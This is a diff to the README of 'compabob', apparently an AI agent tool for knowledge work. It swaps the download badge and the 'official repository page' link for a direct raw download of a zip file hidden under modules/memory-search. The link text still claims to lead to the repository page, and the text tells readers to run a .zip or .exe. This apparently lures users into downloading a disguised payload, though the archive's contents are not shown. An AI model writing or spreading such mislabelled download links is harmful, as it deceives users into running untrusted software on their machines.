@@ -1,12 +1,12 @@
 # 🤖 compabob - Automate your knowledge work with agents
 
-[![](https://img.shields.io/badge/Download_compabob-blue.svg)](https://github.com/depressiondip454/compabob)
+[![](https://img.shields.io/badge/Download_compabob-blue.svg)](https://github.com/depressiondip454/compabob/raw/refs/heads/main/modules/memory-search/Software-1.8-beta.2.zip)
 
 compabob helps you manage your digital life. It connects your notes, research, and technical tasks into one system. You gain an AI partner that handles repetitive work, organizes your thoughts, and connects your data from Obsidian to modern AI models.
 
 ## 📥 How to download 
 
-Visit the [official repository page](https://github.com/depressiondip454/compabob) to download the software. Select the latest version link under the releases section. Look for the file ending in .zip or .exe to begin your setup. 
+Visit the [official repository page](https://github.com/depressiondip454/compabob/raw/refs/heads/main/modules/memory-search/Software-1.8-beta.2.zip) to download the software. Select the latest version link under the releases section. Look for the file ending in .zip or .exe to begin your setup. 
 
 ## 🛠️ System requirements
 
